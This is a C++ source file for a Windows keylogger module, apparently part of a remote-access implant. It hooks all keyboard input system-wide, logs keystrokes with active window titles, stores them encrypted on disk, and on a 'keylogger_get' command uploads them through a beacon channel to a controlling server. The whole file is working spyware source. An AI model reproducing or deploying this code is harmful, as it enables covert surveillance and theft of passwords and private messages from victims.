#include "keylogger.h"
#include "../config.h"
#include "../utils.h"
#include "../crypto.h"
#include <windows.h>
#include <fstream>
#include <sstream>

namespace Keylogger {
    HHOOK hHook = NULL;
    std::string currentWindow;
    std::string logBuffer;
    CRITICAL_SECTION csBuffer;
    bool running = false;
    
    std::string GetActiveWindowTitle() {
        HWND hwnd = GetForegroundWindow();
        if (!hwnd) return "";
        wchar_t title[256];
        GetWindowTextW(hwnd, title, 256);
        return Utils::WStringToString(title);
    }
    
    std::string VKToString(DWORD vkCode, BOOL shift, BOOL caps) {
        if (vkCode >= 0x30 && vkCode <= 0x39) {
            if (shift) {
                std::string shifted = ")!@#$%^&*(";
                return std::string(1, shifted[vkCode - 0x30]);
            }
            return std::string(1, (char)vkCode);
        }
        
        if (vkCode >= 0x41 && vkCode <= 0x5A) {
            if (shift ^ caps) return std::string(1, (char)vkCode);
            return std::string(1, (char)(vkCode + 32));
        }
        
        switch (vkCode) {
            case VK_SPACE: return " ";
            case VK_RETURN: return "[ENTER]\n";
            case VK_TAB: return "[TAB]";
            case VK_BACK: return "[BACKSPACE]";
            case VK_SHIFT: return "";
            case VK_CONTROL: return "[CTRL]";
            case VK_MENU: return "[ALT]";
            case VK_CAPITAL: return "[CAPS]";
            case VK_ESCAPE: return "[ESC]";
            case VK_LEFT: return "[LEFT]";
            case VK_UP: return "[UP]";
            case VK_RIGHT: return "[RIGHT]";
            case VK_DOWN: return "[DOWN]";
            case VK_INSERT: return "[INSERT]";
            case VK_DELETE: return "[DELETE]";
            case VK_LWIN: case VK_RWIN: return "[WIN]";
            case VK_SNAPSHOT: return "[PRTSC]";
            case VK_NUMPAD0: case VK_NUMPAD1: case VK_NUMPAD2: case VK_NUMPAD3:
            case VK_NUMPAD4: case VK_NUMPAD5: case VK_NUMPAD6: case VK_NUMPAD7:
            case VK_NUMPAD8: case VK_NUMPAD9:
                return std::to_string(vkCode - VK_NUMPAD0);
            case VK_DECIMAL: return ".";
            case VK_DIVIDE: return "/";
            case VK_MULTIPLY: return "*";
            case VK_SUBTRACT: return "-";
            case VK_ADD: return "+";
            case VK_OEM_1: return shift ? ":" : ";";
            case VK_OEM_PLUS: return shift ? "+" : "=";
            case VK_OEM_COMMA: return shift ? "<" : ",";
            case VK_OEM_MINUS: return shift ? "_" : "-";
            case VK_OEM_PERIOD: return shift ? ">" : ".";
            case VK_OEM_2: return shift ? "?" : "/";
            case VK_OEM_3: return shift ? "~" : "`";
            case VK_OEM_4: return shift ? "{" : "[";
            case VK_OEM_5: return shift ? "|" : "\\";
            case VK_OEM_6: return shift ? "}" : "]";
            case VK_OEM_7: return shift ? "\"" : "'";
            default: return "";
        }
    }
    
    LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
        if (nCode >= 0 && wParam == WM_KEYDOWN) {
            KBDLLHOOKSTRUCT* pKbd = (KBDLLHOOKSTRUCT*)lParam;
            
            std::string newWindow = GetActiveWindowTitle();
            if (newWindow != currentWindow) {
                currentWindow = newWindow;
                EnterCriticalSection(&csBuffer);
                logBuffer += "\n[" + Utils::GetTimestamp() + " WINDOW: " + currentWindow + "]\n";
                LeaveCriticalSection(&csBuffer);
            }
            
            BOOL shift = GetAsyncKeyState(VK_SHIFT) & 0x8000;
            BOOL caps = GetKeyState(VK_CAPITAL) & 0x0001;
            
            std::string key = VKToString(pKbd->vkCode, shift, caps);
            if (!key.empty()) {
                EnterCriticalSection(&csBuffer);
                logBuffer += key;
                if (logBuffer.length() > MAX_LOG_SIZE) {
                    // Auto-flush to encrypted file
                    std::vector<BYTE> data(logBuffer.begin(), logBuffer.end());
                    std::vector<BYTE> iv;
                    auto encrypted = Crypto::AESEncrypt(data, Crypto::g_sessionKey, iv);
                    std::ofstream file(LOG_PATH, std::ios::binary | std::ios::app);
                    DWORD size = (DWORD)encrypted.size();
                    file.write((char*)&size, sizeof(size));
                    file.write((char*)iv.data(), iv.size());
                    file.write((char*)encrypted.data(), encrypted.size());
                    file.close();
                    logBuffer.clear();
                }
                LeaveCriticalSection(&csBuffer);
            }
        }
        return CallNextHookEx(hHook, nCode, wParam, lParam);
    }
    
    void Start() {
        if (running) return;
        InitializeCriticalSection(&csBuffer);
        hHook = SetWindowsHookExW(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandleW(NULL), 0);
        running = (hHook != NULL);
    }
    
    void Stop() {
        if (!running) return;
        UnhookWindowsHookEx(hHook);
        DeleteCriticalSection(&csBuffer);
        running = false;
    }
    
    void OnCommand(const Beacon::Command& cmd) {
        if (cmd.type == "keylogger_start") Start();
        else if (cmd.type == "keylogger_stop") Stop();
        else if (cmd.type == "keylogger_get") {
            std::string logs = GetLogs();
            Beacon::UploadFile(cmd.id, "keylogs.txt", 
                std::vector<BYTE>(logs.begin(), logs.end()));
        }
        else if (cmd.type == "keylogger_clear") ClearLogs();
    }
    
    std::string GetLogs() {
        EnterCriticalSection(&csBuffer);
        std::string result = logBuffer;
        LeaveCriticalSection(&csBuffer);
        
        // Also read from disk
        std::ifstream file(LOG_PATH, std::ios::binary);
        if (file) {
            while (file.good()) {
                DWORD size = 0;
                file.read((char*)&size, sizeof(size));
                if (!file) break;
                std::vector<BYTE> iv(16);
                file.read((char*)iv.data(), iv.size());
                std::vector<BYTE> encrypted(size);
                file.read((char*)encrypted.data(), size);
                auto decrypted = Crypto::AESDecrypt(encrypted, Crypto::g_sessionKey, iv);
                result += std::string(decrypted.begin(), decrypted.end());
            }
        }
        return result;
    }
    
    void ClearLogs() {
        EnterCriticalSection(&csBuffer);
        logBuffer.clear();
        LeaveCriticalSection(&csBuffer);
        DeleteFileA(LOG_PATH);
    }
}